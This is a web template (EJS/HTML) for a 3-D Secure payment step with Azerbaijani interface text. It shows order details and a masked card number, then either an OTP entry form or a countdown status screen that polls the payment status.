<section class="section">
  <div class="container">
    <div class="secure3d">
      <div class="secure3d__head">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
        </svg>
        <strong><%= t('secure3d.title') %></strong>
      </div>

      <div class="secure3d__body">
        <dl class="kv mb-16">
          <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
          <dt><%= t('secure3d.card') %></dt><dd class="mono"><%= cardMasked || '—' %></dd>
          <dt><%= t('payment.amountLabel') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
        </dl>

        <% if (codeSubmitted) { %>
          <div id="stageBox" class="text-center"
               data-status-url="/api/payment/<%= order._id %>/status"
               data-stage="<%= stage %>"
               data-stage-seconds="<%= stageSeconds %>"
               data-seconds-left="<%= secondsLeft %>">
            <h2 style="font-size:1.15rem" data-stage-title>OTP kodu göndərildi</h2>
            <div data-stage-alert class="alert alert--error" style="display:none"></div>
            <%- include('../partials/countdown-ring') %>
            <p class="sec-note" data-stage-note>Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.</p>
          </div>
        <% } else { %>
          <div class="alert alert--success">Bankdan göndərilən yeni OTP kodunu daxil edin.</div>
          <div id="formNote" class="hidden"></div>
          <form id="codeForm" data-order-id="<%= order._id %>">
            <div class="field">
              <label for="code"><%= t('secure3d.code') %> (OTP)</label>
              <input type="text" id="code" name="code" class="code-input" data-code inputmode="numeric" maxlength="6" placeholder="000000" required autofocus />
            </div>
            <button type="submit" class="btn btn--primary btn--block btn--lg"><%= t('secure3d.submit') %></button>
          </form>
        <% } %>

        <p class="sec-note mt-16 text-center"><%= t('secure3d.waiting') %></p>
      </div>
    </div>
  </div>
</section>

<script src="/public/js/secure-flow.js" defer></script>
